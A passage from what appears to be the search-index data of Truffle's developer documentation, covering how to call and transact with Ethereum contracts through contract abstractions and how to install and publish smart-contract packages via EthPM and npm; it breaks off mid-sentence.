let instance = await MetaCoin . deployed () truffle ( develop ) > instance // outputs: // // Contract // - address: \"0xa9f441a487754e6b27ba044a5a8eb2eec77f6b92\" // - allEvents: () // - getBalance: () // - getBalanceInEth: () // - sendCoin: () // ... Notice that the abstraction contains the exact same functions that exist within our contract. It also contains an address which points to the deployed version of the MetaCoin contract. Executing contract functions \u00b6 Using the abstraction you can easily execute contract functions on the Ethereum network. Making a transaction \u00b6 There are three functions on the MetaCoin contract that we can execute. If you analyze each of them, you'll see that sendCoin is the only function that aims to make changes to the network. The goal of sendCoin is to \"send\" some Meta coins from one account to the next, and these changes should persist. When calling sendCoin , we'll execute it as a transaction. In the following example, we'll send 10 Meta coin from one account to another, in a way that persists changes on the network: truffle ( develop ) > let accounts = await web3 . eth . getAccounts () truffle ( develop ) > instance . sendCoin ( accounts [ 1 ], 10 , { from : accounts [ 0 ]}) There are a few things interesting about the above code: We called the abstraction's sendCoin function directly. This will result in a transaction by default (i.e, writing data) instead of call. We passed an object as the third parameter to sendCoin . Note that the sendCoin function in our Solidity contract doesn't have a third parameter. What you see above is a special object that can always be passed as the last parameter to a function that lets you edit specific details about the transaction (\"transaction params\"). Here, we set the from address ensuring this transaction came from accounts[0] . The transaction params that you can set correspond to the fields in an Ethereum transaction: from to gas gasPrice value data nonce Making a call \u00b6 Continuing with MetaCoin, notice the getBalance function is a great candidate for reading data from the network. It doesn't need to make any changes, as it just returns the MetaCoin balance of the address passed to it. Let's give it a shot: truffle ( develop ) > let balance = await instance . getBalance ( accounts [ 0 ]) truffle ( develop ) > balance . toNumber () What's interesting here: We received a return value. Note that since the Ethereum network can handle very large numbers, we're given a BN object which we then convert to a number. Warning : We convert the return value to a number because in this example the numbers are small. However, if you try to convert a BN that's larger than the largest integer supported by Javascript, you'll likely run into errors or unexpected behavior. Processing transaction results \u00b6 When you make a transaction, you're given a result object that gives you a wealth of information about the transaction. truffle ( develop ) > let result = await instance . sendCoin ( accounts [ 1 ], 10 , { from : accounts [ 0 ]}) truffle ( develop ) > result Specifically, you get the following: result.tx (string) - Transaction hash result.logs (array) - Decoded events (logs) result.receipt (object) - Transaction receipt (includes the amount of gas used) For more information, please see the README in the @truffle/contract package. Catching events \u00b6 Your contracts can fire events that you can catch to gain more insight into what your contracts are doing. The easiest way to handle events is by processing the logs array contained within result object of the transaction that triggered the event. If we explicitly output the first log entry we can see the details of the event that was emitted as part of the sendCoin call ( Transfer(msg.sender, receiver, amount); ). truffle ( develop ) > result . logs [ 0 ] { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x3b33960e99416f687b983d4a6bb628d38bf7855c6249e71d0d16c7930a588cb2' , blockHash : '0xe36787063e114a763469e7dabc7aa57545e67eb2c395a1e6784988ac065fdd59' , blockNumber : 8 , address : '0x6891Ac4E2EF3dA9bc88C96fEDbC9eA4d6D88F768' , type : 'mined' , id : 'log_3181e274' , event : 'Transfer' , args : Result { '0' : '0x8128880DC48cde7e471EF6b99d3877357bb93f01' , '1' : '0x12B6971f6eb35dD138a03Bd6cBdf9Fc9b9a87d7e' , '2' : < BN : a > , __length__ : 3 , _from : '0x8128880DC48cde7e471EF6b99d3877357bb93f01' , _to : '0x12B6971f6eb35dD138a03Bd6cBdf9Fc9b9a87d7e' , _value : < BN : a > } } Add a new contract to the network \u00b6 In all of the above cases, we've been using a contract abstraction that has already been deployed. We can deploy our own version to the network using the .new() function: truffle ( develop ) > let newInstance = await MetaCoin . new () truffle ( develop ) > newInstance . address '0x64307b67314b584b1E3Be606255bd683C835A876' Use a contract at a specific address \u00b6 If you already have an address for a contract, you can create a new abstraction to represent the contract at that address. let specificInstance = await MetaCoin . at ( \"0x1234...\" ); Sending ether to a contract \u00b6 You may simply want to send Ether directly to a contract, or trigger a contract's fallback function . You can do so using one of the following two options. Option 1: Send a transaction directly to a contract via instance.sendTransaction() . This is promisified like all available contract instance functions, and has the same API as web3.eth.sendTransaction but without the callback. The to value will be automatically filled in for you if not specified. instance . sendTransaction ({...}). then ( function ( result ) { // Same transaction result object as above. }); Option 2: There's also shorthand for just sending Ether directly: instance . send ( web3 . utils . toWei ( 1 , \"ether\" )). then ( function ( result ) { // Same result object as above. }); Special methods on Truffle contract objects \u00b6 There are a couple of special functions that you can find on the actual contract methods of your contract abstractions: estimateGas sendTransaction call request The first special method mentioned above is the estimateGas method. This, as you probably can guess, estimates the amount of gas that a transaction will require. If we wanted to estimate the gas for a transaction, we would call it on the contract method itself. It would look something like the following: const instance = await MyContract . deployed (); const amountOfGas = await instance . sendTokens . estimateGas ( 4 , myAccount ); This will give us an estimate of how much gas it will take to run the transaction specified. Note that the arguments above ( 4 and myAccount ) correspond to whatever the signature of the contract method happens to be. Another useful thing to note is that you can also call this on a contract's new method to see how much gas it will take to deploy. So you would do Contract.new.estimateGas() to get the gas estimate for the contract's deployment. The next mentioned method is sendTransaction . In general, if you execute a contract method, Truffle will intelligently figure out whether it needs to make a transaction or a call. If your function can be executed as a call, then Truffle will do so and you will be able to avoid gas costs. There may be some scenarios, however, where you want to force Truffle to make a transaction. In these cases, you can use the sendTransaction method found on the method itself. This would look something like instance.myMethod.sendTransaction() . For example, suppose I have a contract instance with the method getTokenBalance . I could do the following to force a transaction to take place while executing getTokenBalance : const instance = await MyContract . deployed (); const result = await instance . getTokenBalance . sendTransaction ( myAccount ); The result variable above will be the same kind of result you would get from executing any normal transaction in Truffle. It will contain the transaction hash, the logs, etc. The next method is call and the syntax is exactly the same as for sendTransaction . If you want to explicitly make a call, you can use the call method found on your contract abstraction's method. So you would write something that looks like const result = await instance.myMethod.call() . The last method is request . This method does not perform a transaction or call, but rather returns an object that can be passed to web3.eth.sendTransaction or web3.eth.call if you want to perform the transaction or call yourself. It has the same syntax as the others, and like with estimateGas , you can also do Contract.new.request() if you want to perform a manual deployment. Invoking overloaded methods \u00b6 The current implementation of Truffle's contract abstraction can mistakenly infer the signature of an overloaded method even though it exists in the contract ABI. Therefore, some methods may not be accessible through the contract's instance, but their accessors can be invoked explicitly via the .methods property of the contract. const instance = await MyContract . deployed (); instance . methods [ 'setValue(uint256)' ]( 123 ); instance . methods [ 'setValue(uint256,uint256)' ]( 11 , 55 ); Please see this issue here for more information. Using enumerations \u00b6 Contract abstractions can also be used to access Solidity enumerations defined within that contract. For instance, suppose we have the following Solidity contract: contract ExampleContract { enum ExampleEnum { ExampleOption0 , ExampleOption1 , ExampleOption2 } // ... } One could then use ExampleContract.ExampleEnum.ExampleOption0 to access that enum value; in this case, that is equal to 0 , but using this allows one to pass in enums to contract methods without having to worry about their numerical value. A contract's enums are also available under .enums , so in this case, one could also write ExampleContract.enums.ExampleEnum.ExampleOption0 . Further reading \u00b6 The contract abstractions provided by Truffle contain a wealth of utilities for making interacting with your contracts easy. Check out the @truffle/contract documentation for tips, tricks and insights.","title":"Interacting with Your Contracts"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#interacting-with-your-contracts","text":"","title":"Interacting with your contracts"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#introduction","text":"If you were writing raw requests to the Ethereum network yourself in order to interact with your contracts, you'd soon realize that writing these requests is clunky and cumbersome. As well, you might find that managing the state for each request you've made is complicated . Fortunately, Truffle takes care of this complexity for you, to make interacting with your contracts a breeze.","title":"Introduction"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#reading-and-writing-data","text":"The Ethereum network makes a distinction between writing data to the network and reading data from it, and this distinction plays a significant part in how you write your application. In general, writing data is called a transaction whereas reading data is called a call . Transactions and calls are treated very differently, and have the following characteristics.","title":"Reading and writing data"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#transactions","text":"Transactions fundamentally change the state of the network. A transaction can be as simple as sending Ether to another account, or as complicated as executing a contract function or adding a new contract to the network. The defining characteristic of a transaction is that it writes (or changes) data. Transactions cost Ether to run, known as \"gas\", and transactions take time to process. When you execute a contract's function via a transaction, you cannot receive that function's return value because the transaction isn't processed immediately. In general, functions meant to be executed via a transaction will not return a value; they will return a transaction id instead. So in summary, transactions: Cost gas (Ether) Change the state of the network Aren't processed immediately Won't expose a return value (only a transaction id).","title":"Transactions"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#calls","text":"Calls, on the other hand, are very different. Calls can be used to execute code on the network, though no data will be permanently changed. Calls are free to run, and their defining characteristic is that they read data. When you execute a contract function via a call you will receive the return value immediately. In summary, calls: Are free (do not cost gas) Do not change the state of the network Are processed immediately Will expose a return value (hooray!) Choosing between a transaction and a call is as simple as deciding whether you want to read data, or write it.","title":"Calls"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#introducing-abstractions","text":"Contract abstractions are the bread and butter of interacting with Ethereum contracts from Javascript. In short, contract abstractions are wrapper code that makes interaction with your contracts easy, in a way that lets you forget about the many engines and gears executing under the hood. Truffle uses its own contract abstraction via the @truffle/contract module, and it is this contract abstraction that's described below. In order to appreciate the usefulness of a contract abstraction, however, we first need a contract to talk about. We'll use the MetaCoin contract available to you through Truffle Boxes via truffle unbox metacoin . pragma solidity >= 0.4.25 < 0.6.0 ; import \"./ConvertLib.sol\" ; // This is just a simple example of a coin-like contract. // It is not standards compatible and cannot be expected to talk to other // coin/token contracts. If you want to create a standards-compliant // token, see: https://github.com/ConsenSys/Tokens. Cheers! contract MetaCoin { mapping ( address => uint ) balances ; event Transfer ( address indexed _from , address indexed _to , uint256 _value ); constructor () public { balances [ tx.origin ] = 10000 ; } function sendCoin ( address receiver , uint amount ) public returns ( bool sufficient ) { if ( balances [ msg.sender ] < amount ) return false ; balances [ msg.sender ] -= amount ; balances [ receiver ] += amount ; emit Transfer ( msg.sender , receiver , amount ); return true ; } function getBalanceInEth ( address addr ) public view returns ( uint ){ return ConvertLib . convert ( getBalance ( addr ), 2 ); } function getBalance ( address addr ) public view returns ( uint ) { return balances [ addr ]; } } This contract has three methods aside from the constructor ( sendCoin , getBalanceInEth , and getBalance ). All three methods can be executed as either a transaction or a call. Now let's look at the Javascript object called MetaCoin provided for us by Truffle, as made available in the Truffle console : truffle ( develop ) > let instance = await MetaCoin . deployed () truffle ( develop ) > instance // outputs: // // Contract // - address: \"0xa9f441a487754e6b27ba044a5a8eb2eec77f6b92\" // - allEvents: () // - getBalance: () // - getBalanceInEth: () // - sendCoin: () // ... Notice that the abstraction contains the exact same functions that exist within our contract. It also contains an address which points to the deployed version of the MetaCoin contract.","title":"Introducing abstractions"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#executing-contract-functions","text":"Using the abstraction you can easily execute contract functions on the Ethereum network.","title":"Executing contract functions"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#making-a-transaction","text":"There are three functions on the MetaCoin contract that we can execute. If you analyze each of them, you'll see that sendCoin is the only function that aims to make changes to the network. The goal of sendCoin is to \"send\" some Meta coins from one account to the next, and these changes should persist. When calling sendCoin , we'll execute it as a transaction. In the following example, we'll send 10 Meta coin from one account to another, in a way that persists changes on the network: truffle ( develop ) > let accounts = await web3 . eth . getAccounts () truffle ( develop ) > instance . sendCoin ( accounts [ 1 ], 10 , { from : accounts [ 0 ]}) There are a few things interesting about the above code: We called the abstraction's sendCoin function directly. This will result in a transaction by default (i.e, writing data) instead of call. We passed an object as the third parameter to sendCoin . Note that the sendCoin function in our Solidity contract doesn't have a third parameter. What you see above is a special object that can always be passed as the last parameter to a function that lets you edit specific details about the transaction (\"transaction params\"). Here, we set the from address ensuring this transaction came from accounts[0] . The transaction params that you can set correspond to the fields in an Ethereum transaction: from to gas gasPrice value data nonce","title":"Making a transaction"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#making-a-call","text":"Continuing with MetaCoin, notice the getBalance function is a great candidate for reading data from the network. It doesn't need to make any changes, as it just returns the MetaCoin balance of the address passed to it. Let's give it a shot: truffle ( develop ) > let balance = await instance . getBalance ( accounts [ 0 ]) truffle ( develop ) > balance . toNumber () What's interesting here: We received a return value. Note that since the Ethereum network can handle very large numbers, we're given a BN object which we then convert to a number. Warning : We convert the return value to a number because in this example the numbers are small. However, if you try to convert a BN that's larger than the largest integer supported by Javascript, you'll likely run into errors or unexpected behavior.","title":"Making a call"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#processing-transaction-results","text":"When you make a transaction, you're given a result object that gives you a wealth of information about the transaction. truffle ( develop ) > let result = await instance . sendCoin ( accounts [ 1 ], 10 , { from : accounts [ 0 ]}) truffle ( develop ) > result Specifically, you get the following: result.tx (string) - Transaction hash result.logs (array) - Decoded events (logs) result.receipt (object) - Transaction receipt (includes the amount of gas used) For more information, please see the README in the @truffle/contract package.","title":"Processing transaction results"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#catching-events","text":"Your contracts can fire events that you can catch to gain more insight into what your contracts are doing. The easiest way to handle events is by processing the logs array contained within result object of the transaction that triggered the event. If we explicitly output the first log entry we can see the details of the event that was emitted as part of the sendCoin call ( Transfer(msg.sender, receiver, amount); ). truffle ( develop ) > result . logs [ 0 ] { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x3b33960e99416f687b983d4a6bb628d38bf7855c6249e71d0d16c7930a588cb2' , blockHash : '0xe36787063e114a763469e7dabc7aa57545e67eb2c395a1e6784988ac065fdd59' , blockNumber : 8 , address : '0x6891Ac4E2EF3dA9bc88C96fEDbC9eA4d6D88F768' , type : 'mined' , id : 'log_3181e274' , event : 'Transfer' , args : Result { '0' : '0x8128880DC48cde7e471EF6b99d3877357bb93f01' , '1' : '0x12B6971f6eb35dD138a03Bd6cBdf9Fc9b9a87d7e' , '2' : < BN : a > , __length__ : 3 , _from : '0x8128880DC48cde7e471EF6b99d3877357bb93f01' , _to : '0x12B6971f6eb35dD138a03Bd6cBdf9Fc9b9a87d7e' , _value : < BN : a > } }","title":"Catching events"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#add-a-new-contract-to-the-network","text":"In all of the above cases, we've been using a contract abstraction that has already been deployed. We can deploy our own version to the network using the .new() function: truffle ( develop ) > let newInstance = await MetaCoin . new () truffle ( develop ) > newInstance . address '0x64307b67314b584b1E3Be606255bd683C835A876'","title":"Add a new contract to the network"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#use-a-contract-at-a-specific-address","text":"If you already have an address for a contract, you can create a new abstraction to represent the contract at that address. let specificInstance = await MetaCoin . at ( \"0x1234...\" );","title":"Use a contract at a specific address"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#sending-ether-to-a-contract","text":"You may simply want to send Ether directly to a contract, or trigger a contract's fallback function . You can do so using one of the following two options. Option 1: Send a transaction directly to a contract via instance.sendTransaction() . This is promisified like all available contract instance functions, and has the same API as web3.eth.sendTransaction but without the callback. The to value will be automatically filled in for you if not specified. instance . sendTransaction ({...}). then ( function ( result ) { // Same transaction result object as above. }); Option 2: There's also shorthand for just sending Ether directly: instance . send ( web3 . utils . toWei ( 1 , \"ether\" )). then ( function ( result ) { // Same result object as above. });","title":"Sending ether to a contract"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#special-methods-on-truffle-contract-objects","text":"There are a couple of special functions that you can find on the actual contract methods of your contract abstractions: estimateGas sendTransaction call request The first special method mentioned above is the estimateGas method. This, as you probably can guess, estimates the amount of gas that a transaction will require. If we wanted to estimate the gas for a transaction, we would call it on the contract method itself. It would look something like the following: const instance = await MyContract . deployed (); const amountOfGas = await instance . sendTokens . estimateGas ( 4 , myAccount ); This will give us an estimate of how much gas it will take to run the transaction specified. Note that the arguments above ( 4 and myAccount ) correspond to whatever the signature of the contract method happens to be. Another useful thing to note is that you can also call this on a contract's new method to see how much gas it will take to deploy. So you would do Contract.new.estimateGas() to get the gas estimate for the contract's deployment. The next mentioned method is sendTransaction . In general, if you execute a contract method, Truffle will intelligently figure out whether it needs to make a transaction or a call. If your function can be executed as a call, then Truffle will do so and you will be able to avoid gas costs. There may be some scenarios, however, where you want to force Truffle to make a transaction. In these cases, you can use the sendTransaction method found on the method itself. This would look something like instance.myMethod.sendTransaction() . For example, suppose I have a contract instance with the method getTokenBalance . I could do the following to force a transaction to take place while executing getTokenBalance : const instance = await MyContract . deployed (); const result = await instance . getTokenBalance . sendTransaction ( myAccount ); The result variable above will be the same kind of result you would get from executing any normal transaction in Truffle. It will contain the transaction hash, the logs, etc. The next method is call and the syntax is exactly the same as for sendTransaction . If you want to explicitly make a call, you can use the call method found on your contract abstraction's method. So you would write something that looks like const result = await instance.myMethod.call() . The last method is request . This method does not perform a transaction or call, but rather returns an object that can be passed to web3.eth.sendTransaction or web3.eth.call if you want to perform the transaction or call yourself. It has the same syntax as the others, and like with estimateGas , you can also do Contract.new.request() if you want to perform a manual deployment.","title":"Special methods on Truffle contract objects"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#invoking-overloaded-methods","text":"The current implementation of Truffle's contract abstraction can mistakenly infer the signature of an overloaded method even though it exists in the contract ABI. Therefore, some methods may not be accessible through the contract's instance, but their accessors can be invoked explicitly via the .methods property of the contract. const instance = await MyContract . deployed (); instance . methods [ 'setValue(uint256)' ]( 123 ); instance . methods [ 'setValue(uint256,uint256)' ]( 11 , 55 ); Please see this issue here for more information.","title":"Invoking overloaded methods"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#using-enumerations","text":"Contract abstractions can also be used to access Solidity enumerations defined within that contract. For instance, suppose we have the following Solidity contract: contract ExampleContract { enum ExampleEnum { ExampleOption0 , ExampleOption1 , ExampleOption2 } // ... } One could then use ExampleContract.ExampleEnum.ExampleOption0 to access that enum value; in this case, that is equal to 0 , but using this allows one to pass in enums to contract methods without having to worry about their numerical value. A contract's enums are also available under .enums , so in this case, one could also write ExampleContract.enums.ExampleEnum.ExampleOption0 .","title":"Using enumerations"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html#further-reading","text":"The contract abstractions provided by Truffle contain a wealth of utilities for making interacting with your contracts easy. Check out the @truffle/contract documentation for tips, tricks and insights.","title":"Further reading"},{"location":"docs/truffle/getting-started/package-management-via-ethpm.html","text":"Package Management via EthPM \u00b6 EthPM is the new Package Registry for Ethereum. It follows the ERC190 spec for publishing and consuming smart contract packages, and has gained wide support from many diverse Ethereum development tools. To show our support, we've integrated the Ethereum Package Registry directly into Truffle. Installing a package \u00b6 Installing a package from EthPM is nearly as easy as installing a package via NPM. You can simply run the following command: $ truffle install <package name> You can also install a package at a specific version: $ truffle install <package name>@<version> Like NPM, EthPM versions follow semver . You can find a list of all available packages at the Ethereum Package Registry . Installing Dependencies \u00b6 Your project can define an ethpm.json file that among other things can pin your project to specific dependencies and versions. To install all dependencies listed in the ethpm.json file, run: $ truffle install For more details on the ethpm.json file, see the package configuration below. Consuming installed contracts \u00b6 Installed packages will be placed in the installed_contracts directory within your project folder. If no installed_contracts directory exists it'll be created for you. You should treat this folder like you treat the node_modules folder with NPM -- that is, you shouldn't edit the contents inside unless you know what you're doing. :) Installed packages can be consumed within your tests, migrations and solidity contract files by import 'ing or require 'ing that package and contract by name. For example, the following Solidity contract would import the owned.sol file from the owned package: pragma solidity ^ 0.4.2 ; import \"owned/owned.sol\" ; contract MyContract is owned { // ... } Similarly, the following migration file would use the ENS.sol contract from the ens package: File: ./migrations/2_deploy_contracts.js var ENS = artifacts . require ( \"ens/ENS\" ); var MyContract = artifacts . require ( \"MyContract\" ); module . exports = function ( deployer ) { // Only deploy ENS if there's not already an address already. // i.e., don't deploy if we're using the canonical ENS address, // but do deploy it if we're on a test network and ENS doesn't exist. deployer . deploy ( ENS , { overwrite : false }). then ( function () { return deployer . deploy ( MyContract , ENS . address ); }); }; Note that in the migration above, we consume the ens package and deploy the ENS contract conditionally based on whether or not ENS already has an address set. This is a fancy trick provided to you by the deployer that makes it much easier to write migrations dependent on the the existence of network artifacts. In this case, if we were running our migrations on the Ropsten network, this migration wouldn't deploy the ENS contract because (at the time of this writing) Ropsten is where the canonical ENS contract exists -- we wouldn't want to deploy our own. But if we were running our migrations against a different network, or a test network perhaps, then we'd want to deploy the ENS contract so that we have a dependency contract to work with. Publishing your own package \u00b6 Publishing your own package is as straightforward as installing, but like NPM, requires a bit more configuration. Ropsten, Ropsten, Ropsten \u00b6 The Ethereum Package Registry currently exists on the Ropsten test network. To publish to the registry, we need to set up our own Ropsten configuration because we'll be making transactions that need to be signed. In this example, we'll use Infura for publishing packages along with the truffle-hdwallet-provider NPM module and a 12-word hd-wallet mnemonic that represents our Ethereum address on the Ropsten network. First, install the truffle-hdwallet-provider via NPM within your project directory: $ npm install truffle-hdwallet-provider --save Then edit your configuration to add the ropsten network using your 12-word mnemonic: File: truffle.js var HDWalletProvider = require ( \"truffle-hdwallet-provider\" ); // 12-word mnemonic var mnemonic = \"opinion destroy betray ...\" ; module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" // Match any network id }, ropsten : { provider : () => new HDWalletProvider ( mnemonic , \"https://ropsten.infura.io/v3/YOUR-PROJECT-ID\" ), network_id : 3 // official id of the ropsten network } } }; Package configuration \u00b6 Like NPM, configuration options for EthPM go in a separate JSON file called ethpm.json . This file sits alongside your Truffle configuration and gives Truffle all the information it needs to publish your package. You can see a full list of available options in the Configuration section. File: ethpm.json { \"package_name\" : \"adder\" , \"version\" : \"0.0.3\" , \"description\" : \"Simple contract to add two numbers\" , \"authors\" : [ \"Tim Coulter <tim.coulter@consensys.net>\" ], \"keywords\" : [ \"ethereum\" , \"addition\" ], \"dependencies\" : { \"owned\" : \"^0.0.1\" }, \"license\" : \"MIT\" } Command \u00b6 After you have your configuration settled, publishing is a snap: $ truffle publish You'll see output similar to that below, with confirmation that your package was published successfully. $ truffle publish Gathering contracts... Finding publishable artifacts... Uploading sources and publishing to registry... + adder@0.0.3 Before publishing \u00b6 When using a network like the default develop network that's configured to match any Ethereum client (like Ganache or Truffle Develop), you're bound to have network artifacts lying around that you don't want published. Before publishing your package, consider running the following command to remove any extraneous network artifacts: $ truffle networks --clean See the command reference for more information.","title":"Package Management via EthPM"},{"location":"docs/truffle/getting-started/package-management-via-ethpm.html#package-management-via-ethpm","text":"EthPM is the new Package Registry for Ethereum. It follows the ERC190 spec for publishing and consuming smart contract packages, and has gained wide support from many diverse Ethereum development tools. To show our support, we've integrated the Ethereum Package Registry directly into Truffle.","title":"Package Management via EthPM"},{"location":"docs/truffle/getting-started/package-management-via-ethpm.html#installing-a-package","text":"Installing a package from EthPM is nearly as easy as installing a package via NPM. You can simply run the following command: $ truffle install <package name> You can also install a package at a specific version: $ truffle install <package name>@<version> Like NPM, EthPM versions follow semver . You can find a list of all available packages at the Ethereum Package Registry .","title":"Installing a package"},{"location":"docs/truffle/getting-started/package-management-via-ethpm.html#installing-dependencies","text":"Your project can define an ethpm.json file that among other things can pin your project to specific dependencies and versions. To install all dependencies listed in the ethpm.json file, run: $ truffle install For more details on the ethpm.json file, see the package configuration below.","title":"Installing Dependencies"},{"location":"docs/truffle/getting-started/package-management-via-ethpm.html#consuming-installed-contracts","text":"Installed packages will be placed in the installed_contracts directory within your project folder. If no installed_contracts directory exists it'll be created for you. You should treat this folder like you treat the node_modules folder with NPM -- that is, you shouldn't edit the contents inside unless you know what you're doing. :) Installed packages can be consumed within your tests, migrations and solidity contract files by import 'ing or require 'ing that package and contract by name. For example, the following Solidity contract would import the owned.sol file from the owned package: pragma solidity ^ 0.4.2 ; import \"owned/owned.sol\" ; contract MyContract is owned { // ... } Similarly, the following migration file would use the ENS.sol contract from the ens package: File: ./migrations/2_deploy_contracts.js var ENS = artifacts . require ( \"ens/ENS\" ); var MyContract = artifacts . require ( \"MyContract\" ); module . exports = function ( deployer ) { // Only deploy ENS if there's not already an address already. // i.e., don't deploy if we're using the canonical ENS address, // but do deploy it if we're on a test network and ENS doesn't exist. deployer . deploy ( ENS , { overwrite : false }). then ( function () { return deployer . deploy ( MyContract , ENS . address ); }); }; Note that in the migration above, we consume the ens package and deploy the ENS contract conditionally based on whether or not ENS already has an address set. This is a fancy trick provided to you by the deployer that makes it much easier to write migrations dependent on the the existence of network artifacts. In this case, if we were running our migrations on the Ropsten network, this migration wouldn't deploy the ENS contract because (at the time of this writing) Ropsten is where the canonical ENS contract exists -- we wouldn't want to deploy our own. But if we were running our migrations against a different network, or a test network perhaps, then we'd want to deploy the ENS contract so that we have a dependency contract to work with.","title":"Consuming installed contracts"},{"location":"docs/truffle/getting-started/package-management-via-ethpm.html#publishing-your-own-package","text":"Publishing your own package is as straightforward as installing, but like NPM, requires a bit more configuration.","title":"Publishing your own package"},{"location":"docs/truffle/getting-started/package-management-via-ethpm.html#ropsten-ropsten-ropsten","text":"The Ethereum Package Registry currently exists on the Ropsten test network. To publish to the registry, we need to set up our own Ropsten configuration because we'll be making transactions that need to be signed. In this example, we'll use Infura for publishing packages along with the truffle-hdwallet-provider NPM module and a 12-word hd-wallet mnemonic that represents our Ethereum address on the Ropsten network. First, install the truffle-hdwallet-provider via NPM within your project directory: $ npm install truffle-hdwallet-provider --save Then edit your configuration to add the ropsten network using your 12-word mnemonic: File: truffle.js var HDWalletProvider = require ( \"truffle-hdwallet-provider\" ); // 12-word mnemonic var mnemonic = \"opinion destroy betray ...\" ; module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" // Match any network id }, ropsten : { provider : () => new HDWalletProvider ( mnemonic , \"https://ropsten.infura.io/v3/YOUR-PROJECT-ID\" ), network_id : 3 // official id of the ropsten network } } };","title":"Ropsten, Ropsten, Ropsten"},{"location":"docs/truffle/getting-started/package-management-via-ethpm.html#package-configuration","text":"Like NPM, configuration options for EthPM go in a separate JSON file called ethpm.json . This file sits alongside your Truffle configuration and gives Truffle all the information it needs to publish your package. You can see a full list of available options in the Configuration section. File: ethpm.json { \"package_name\" : \"adder\" , \"version\" : \"0.0.3\" , \"description\" : \"Simple contract to add two numbers\" , \"authors\" : [ \"Tim Coulter <tim.coulter@consensys.net>\" ], \"keywords\" : [ \"ethereum\" , \"addition\" ], \"dependencies\" : { \"owned\" : \"^0.0.1\" }, \"license\" : \"MIT\" }","title":"Package configuration"},{"location":"docs/truffle/getting-started/package-management-via-ethpm.html#command","text":"After you have your configuration settled, publishing is a snap: $ truffle publish You'll see output similar to that below, with confirmation that your package was published successfully. $ truffle publish Gathering contracts... Finding publishable artifacts... Uploading sources and publishing to registry... + adder@0.0.3","title":"Command"},{"location":"docs/truffle/getting-started/package-management-via-ethpm.html#before-publishing","text":"When using a network like the default develop network that's configured to match any Ethereum client (like Ganache or Truffle Develop), you're bound to have network artifacts lying around that you don't want published. Before publishing your package, consider running the following command to remove any extraneous network artifacts: $ truffle networks --clean See the command reference for more information.","title":"Before publishing"},{"location":"docs/truffle/getting-started/package-management-via-npm.html","text":"Package Management via NPM \u00b6 Truffle comes standard with npm integration, and is aware of the node_modules directory in your project if it exists. This means you can use and distribute contracts, dapps and Ethereum-enabled libraries via npm , making your code available to others and other's code available to you. Package layout \u00b6 Projects created with Truffle have a specific layout by default which enables them to be used as packages. This layout isn't required, but if used as a common convention -- or \"de-facto standard\" -- then distributing contracts and dapps through NPM will become much easier. The most important directories in a Truffle package are the following: /contracts /build (which includes /build/contracts , created by Truffle) The first directory is your contracts directory, which includes your raw Solidity contracts. The second directory is the build directory, and more specifically /build/contracts , which holds build artifacts in the form of .json files. Including raw contracts in your package will allow others to import those contracts within their own solidity code. Similarly, including your .json build artifacts in your package will allow others to seamlessly interact with your contracts from JavaScript, which can be used in dapps, scripts and migrations. Using a package \u00b6 When using a package within your own project, it is important to note that there are two places where you might be interested in using other's contract code: within your contracts and within your Javascript code (migrations and tests). The following provides an example of each case, and discusses techniques for making the most of other's contracts and build artifacts. Installing \u00b6 For this example, we're going to use the Example Truffle Library , which provides a simple name registry that is deployed to the Morden test network. In order to use it as a dependency, we must first install it within our project through npm : $ cd my_project $ npm install example-truffle-library Note that the last command above downloads the package and places it in my_project/node_modules directory, which is important for the examples below. See the npm documentation for help using npm to install packages. Within your contracts \u00b6 To use a package's contracts within your contracts, this can be as simple as Solidity's import statement. When your import path isn't explicitly relative or absolute , this signifies to Truffle that you're looking for a file from a specific named package. Consider this example using the Example Truffle Library mentioned above: import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; Since the path didn't start with ./ , Truffle knows to look in your project's node_modules directory for the example-truffle-library folder. From there, it resolves the path to provide you the contract you requested. Within JavaScript code \u00b6 To interact with package's contracts within JavaScript code, you simply need to require that package's .json files, and then use the @truffle/contract module to turn those into usable abstractions: var contract = require ( \"@truffle/contract\" ); var data = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.json\" ); var SimpleNameRegistry = contract ( data ); To use these abstractions, see the Interacting With Your Contracts section for more details. Package's deployed addresses \u00b6 Sometimes you want your contracts to interact with the package's previously deployed contracts. Since the deployed addresses exist within the package's .json files, you must perform an extra step to get those addresses into your contracts. To do so, make your contract accept the address of the dependency contract, and then use migrations. The following is an example contract that exists within your project as well as an example migration: Contract: MyContract.sol pragma solidity ^ 0.4.13 ; import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; contract MyContract { SimpleNameRegistry registry ; address public owner ; function MyContract { owner = msg.sender ; } // Simple example that uses the deployed registry from the package. function getModule ( bytes32 name ) returns ( address ) { return registry . names ( name ); } // Set the registry if you're the owner. function setRegistry ( address addr ) { require ( msg.sender == owner ); registry = SimpleNameRegistry ( addr ); } } Migration: 3_hook_up_example_library.js // Note that artifacts.require takes care of creating an abstraction for us. var SimpleNameRegistry = artifacts . require ( \"example-truffle-library/SimpleNameRegistry\" ); module . exports = function ( deployer ) { // Deploy our contract, then set the address of the registry. deployer . deploy ( MyContract ). then ( function () { return MyContract . deployed (); }). then ( function ( deployed ) { return deployed . setRegistry ( SimpleNameRegistry . address ); }); }; Before publishing \u00b6 When using a network like the 